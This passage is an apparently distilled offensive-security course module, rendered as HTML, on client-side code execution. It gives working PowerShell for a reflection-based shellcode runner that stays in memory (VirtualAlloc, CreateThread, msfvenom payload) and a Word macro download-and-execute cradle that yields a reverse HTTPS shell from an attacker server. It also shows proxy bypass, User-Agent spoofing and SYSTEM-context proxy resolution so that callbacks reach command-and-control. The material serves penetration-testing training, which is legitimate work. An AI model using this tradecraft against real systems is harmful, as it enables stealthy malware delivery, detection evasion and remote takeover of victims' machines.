+<p>Problem: <code>GetModuleHandle</code>/<code>GetProcAddress</code> in <code>Microsoft.Win32.UnsafeNativeMethods</code> are <strong>internal</strong> — .NET blocks direct calls from PowerShell/C#. The way in is <strong>Reflection</strong>: dynamically obtain references to objects that are otherwise private or internal.</p>
+<p>Two steps (Listings 76/77, folded into the resolver below): (1) grab the System.dll assembly from the loaded-appdomain list filtered on the GAC flag and filename tail, then <code>GetType('Microsoft.Win32.UnsafeNativeMethods')</code>; (2) <code>GetMethod('GetModuleHandle')</code> on that object and call its <code>Invoke</code> — <code>$null</code> as the instance (static method) plus an argument array.</p>
+<p>Wrapped into a reusable resolver (Listing 78):</p>
+<pre><code class="language-powershell">function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq &quot;GetProcAddress&quot;) {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+</code></pre>
+<p>This resolves <strong>any</strong> Win32 API without <code>Add-Type</code> — no compilation, no disk writes.</p>
+<h3>16. DelegateType reflection — pairing an address with a prototype</h3>
+<p>A resolved address needs a function prototype (argument types + return type). C# uses <code>GetDelegateForFunctionPointer(address, delegateType)</code>; PowerShell has no <code>delegate</code> keyword, so build the delegate <strong>manually in memory</strong> via reflection (per Microsoft's 2004 technique):</p>
+<ol>
+<li><code>New-Object System.Reflection.AssemblyName('ReflectedDelegate')</code> — a custom in-memory assembly.</li>
+<li><code>$Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)</code> — <strong>Run</strong> access mode = executable, not saved to disk.</li>
+<li><code>.DefineDynamicModule('InMemoryModule', $false)</code> — no symbol info.</li>
+<li><code>.DefineType('MyDelegateType', &lt;class flags&gt;,</code>[System.MulticastDelegate]<code>)</code> — a sealed, public, AutoClass subclass of <code>MulticastDelegate</code> so it can be instantiated and called.</li>
+<li><code>.DefineConstructor('RTSpecialName, HideBySig, Public', …, @(&lt;argument types&gt;))</code> then <code>.SetImplementationFlags('Runtime, Managed')</code> — the constructor's last argument <strong>is</strong> the function prototype.</li>
+<li><code>.DefineMethod('Invoke', &lt;method flags&gt;, &lt;return type&gt;, @(&lt;argument types&gt;))</code> + implementation flags again — <code>NewSlot</code>/<code>Virtual</code> ensure a fresh vtable slot.</li>
+<li><code>.CreateType()</code> → pass to <code>[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer</code>.</li>
+</ol>
+<p>Full proof-of-concept (Listing 88) — resolve <code>MessageBoxA</code> via <code>LookupFunc</code>, build the delegate, invoke:</p>
+<pre><code class="language-powershell">$MyFunction = [System.Runtime.InteropServices.Marshal]::
+    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
+$MyFunction.Invoke([IntPtr]::Zero,&quot;Hello World&quot;,&quot;This is My MessageBox&quot;,0)
+</code></pre>
+<p>Verification: Process Monitor shows <strong>no .cs source and no compilation</strong> on disk.</p>
+<h3>17. The PowerShell reflection shellcode runner</h3>
+<p>Package the delegate construction into <code>getDelegateType</code> (Listing 89) — it takes the API's argument types as a <code>[Type[]]</code> array plus the return type (default <code>[Void]</code>), chains steps 1–7 above verbatim (assembly → module → type → constructor → <code>Invoke</code>), and returns <code>$type.CreateType()</code>.</p>
+<p>Condensed one-line calls embed <code>LookupFunc</code> + <code>getDelegateType</code> inside <code>GetDelegateForFunctionPointer</code>. Full runner (Listing 93/94) — remember the <strong>32-bit</strong> shellcode because PowerShell is a 32-bit child of Word:</p>
+<pre><code class="language-powershell">$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = &lt;msfvenom -f ps1 output&gt;
+</code></pre>
+<p>Copy the payload into the allocated region, then launch it on a new thread (again resolved + reflected):</p>
+<pre><code class="language-powershell">[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+</code></pre>
+<p>Deployment trick: the Word macro only runs the <code>DownloadString | IEX</code> cradle pointing at <code>run.ps1</code>, so <strong>overwriting the file on the Apache web server</strong> upgrades the payload with no document change — open the doc, get a reverse HTTPS shell from an all-in-memory PowerShell (Listing 95: <code>[*] Started HTTPS reverse handler on https://192.168.119.120:443</code> ... request from <code>192.168.120.11</code>).</p>
+<h3>18. Talking to the proxy — PowerShell cradles vs Meterpreter</h3>
+<p>Enterprises force traffic through proxies for monitoring; testers must make techniques work through the proxy or (situation permitting) bypass it. <strong>Meterpreter HTTP/HTTPS payloads are already proxy-aware</strong>; the PowerShell download cradles are the open question. Lab setup: Squid proxy on the Windows 10 <em>development</em> client <code>192.168.120.12</code>, TCP 3128 (Settings → Network &amp; Internet → Proxy → Manual proxy setup); victim client is <code>192.168.120.11</code>.</p>
+<p><strong>Default behaviour — proxy-aware.</strong> <code>Net.WebClient</code> is proxy-aware today (not always true historically; may revert in future Windows). Its settings live in the <code>.proxy</code> property, populated from <code>DefaultWebProxy</code> at object creation; inspect with <code>GetProxy</code>:</p>
+<pre><code class="language-powershell">[System.Net.WebRequest]::DefaultWebProxy.GetProxy(&quot;http://192.168.119.120/run.ps1&quot;)
+# AbsoluteUri : http://192.168.120.12:3128/   &lt;- request will leave from the proxy
+</code></pre>
+<p>Apache access log confirms the request arrives from <code>192.168.120.12</code> (the proxy), not the victim. <strong>Bypass</strong> — null the proxy:</p>
+<pre><code class="language-powershell">$wc = new-object system.net.WebClient
+$wc.proxy = $null
+$wc.DownloadString(&quot;http://192.168.119.120/run.ps1&quot;)
+</code></pre>
+<p>→ log now shows the request from <code>192.168.120.11</code> directly. Caveat: in some environments non-proxied traffic is blocked at the edge firewall — bypassing the proxy can also mean losing connectivity.</p>
+<h3>19. Fiddling with the User-Agent</h3>
+<p><code>Net.WebClient</code> sets <strong>no default User-Agent</strong>, which stands out in proxy/web logs. Customize via the <code>Headers</code> property:</p>
+<pre><code class="language-powershell">$wc = new-object system.net.WebClient
+$wc.Headers.Add('User-Agent', &quot;This is my agent, there is no one like it...&quot;)
+$wc.DownloadString(&quot;http://192.168.119.120/run.ps1&quot;)
+</code></pre>
+<p>The string lands in the Apache access log (<code>"GET /run.ps1 HTTP/1.1" 304 182 "-" "This is my agent..."</code>). Obviously better: emulate a real browser's User-Agent (Google Chrome / Internet Explorer) instead.</p>
+<h3>20. Give me a SYSTEM proxy — resolving a user proxy as SYSTEM</h3>
+<p>Side-effect of privilege escalation: a SYSTEM-integrity PowerShell cradle has <strong>no proxy configuration</strong> and may fail to call back. Demonstrate from a SYSTEM 32-bit ISE (<code>C:\Tools\Sysinternals&gt; PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe</code>): with the proxy still enabled, the basic cradle's request arrives <strong>directly</strong> from the victim (<code>192.168.120.11</code>), bypassing the proxy.</p>
+<p>Per-user proxy settings live in the registry at <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings</code> (<code>ProxyServer</code> key). As SYSTEM there is no HKCU hive mapped — but <strong>HKEY_USERS</strong> always exists, split by user <strong>SID</strong>. Map it, pick the first real user (SIDs starting <code>S-1-5-21-</code> exclude built-in/service accounts), strip the leading <code>HKEY_USERS\</code> (10 chars), read <code>ProxyServer</code>, and assign a <code>WebProxy</code> object:</p>
+<pre><code class="language-powershell">New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) {if ($key.Name -like &quot;*S-1-5-21-*&quot;) {$start = $key.Name.substring(10);break}}
+$proxyAddr=(Get-ItemProperty -Path &quot;HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\&quot;).ProxyServer
+[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(&quot;http://$proxyAddr&quot;)
+$wc = new-object system.net.WebClient
+$wc.DownloadString(&quot;http://192.168.119.120/run2.ps1&quot;)
+</code></pre>
+<p>Gotchas from the walkthrough:
+- Fetch the shellcode runner as <strong><code>run2.ps1</code></strong> — PowerShell may cache the previously fetched file and skew results.
+- The <code>HKU:</code> mapping persists across reruns of the code — close the PowerShell ISE prompt for the full script to run if earlier incremental steps already mapped it.</p>
+<p>Result: the request now routes through the proxy from <code>192.168.120.12</code> (<code>"GET /run2.ps1 HTTP/1.1" 304 182 "-" "-"</code>) — the cradle calls back to C2 even when all traffic must traverse the proxy.</p>
+<h2>Wrap-up</h2>
+<p>Client-side execution exploits <strong>user behavior</strong>, not software bugs; success depends on a convincing <strong>pretext</strong>. The tradecraft ladder built here:</p>
+<ul>
+<li>Droppers (staged vs non-staged, msfvenom + <code>multi/handler</code>/Netcat) → HTML smuggling for automatic in-browser delivery.</li>
+<li>VBA: auto-open traps + Win32 via <code>Declare</code> → in-memory shellcode runner (<code>VirtualAlloc</code>/<code>RtlMoveMemory</code>/<code>CreateThread</code>) whose weakness is that it dies with Word.</li>
+<li>PowerShell: <code>Add-Type</code> P/Invoke runner (works, but <code>csc</code> writes <code>.cs</code>/<code>.dll</code> to disk) → full <strong>reflection</strong> runner reusing <code>Microsoft.Win32.UnsafeNativeMethods</code> in System.dll with in-memory delegate types — no disk artifacts at all — delivered by a <code>DownloadString | IEX</code> cradle, upgradable server-side without touching the document.</li>
+<li>Network hygiene: <code>Net.WebClient</code> proxy awareness/bypass, custom User-Agent, and SYSTEM-context proxy resolution from HKEY_USERS.</li>
+</ul>
+<p>Gaining an initial shell on a client is the crucial first step; later modules cover additional techniques for it.</p>
+<h2>Extraction notes</h2>
+<ul>
+<li>Source: HTML-extracted course pages (module 03), not ASR; the extraction preserved headings, listings and code blocks cleanly.</li>
+<li>Listing numbers in parentheses refer to the course's own listing numbering (1–112 in this module); lab IPs and ports are verbatim from the course text.</li>
+<li>Minor extraction artifacts observed in this module (footnote markers inlined after identifiers, e.g. "GlobalAssemblyCacheglobalasmcache", "DoEventsdoevents") were decoded back to the intended identifiers; nothing was invented where the artifact was ambiguous.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
